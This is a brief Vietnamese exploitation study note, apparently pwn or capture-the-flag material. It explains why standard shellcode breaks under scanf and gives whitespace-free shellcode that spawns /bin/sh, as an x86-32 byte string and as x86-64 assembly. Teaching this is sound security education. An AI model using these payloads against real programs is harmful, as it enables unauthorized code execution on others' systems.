- Với hàm `scanf` thì shellcode bth sẽ không thực thi được vì hàm `scanf` chỉ đọc đầu vào đến 1 byte như(`" "`,`"\t"`,`"\n"`), do đó với hàm scanf thì phải có 1 shellcode riêng dành cho nó
   + Với x86-32 : `shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'`
   + Với x86-64 :
    ```sh
    shellcode = asm('''
       xor rsi, rsi
       xor rdx, rdx
       push rdx
       mov rbx, 0x68732f2f6e69622f ;(/bin//sh)
       push rbx
       mov rdi, rsp
       push 0x3b
       pop rax
       syscall
    ''')
    ```
     
